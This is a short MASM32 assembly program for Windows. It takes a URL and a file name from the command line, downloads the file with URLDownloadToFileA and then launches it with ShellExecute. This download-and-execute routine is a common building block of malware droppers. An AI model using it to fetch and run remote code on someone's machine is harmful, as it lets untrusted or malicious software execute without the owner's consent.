.386
.model flat, stdcall
option casemap :none  
include \masm32\include\user32.inc
include \masm32\include\urlmon.inc
include \masm32\include\kernel32.inc
include \masm32\include\shell32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\urlmon.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\masm32.lib
.DATA 
  web db 128 dup(0)
  exe db 64 dup(0)
  commandLine dd 0
  cmd db 'open',0
  TextMe db "File Downloaded.",0

.CODE 

start:
invoke GetCommandLine
mov commandLine, eax
invoke GetCL, 1, addr web
 invoke GetCL, 2, addr exe
  push 0
  push 0
  push offset exe
  push offset web
  push 0
  call URLDownloadToFileA
  push 1
  push 0
  push 0
  push offset exe
  push offset cmd
  push 0
  call ShellExecute
     ;invoke StdOut, addr TextMe
invoke ExitProcess, 0
end start
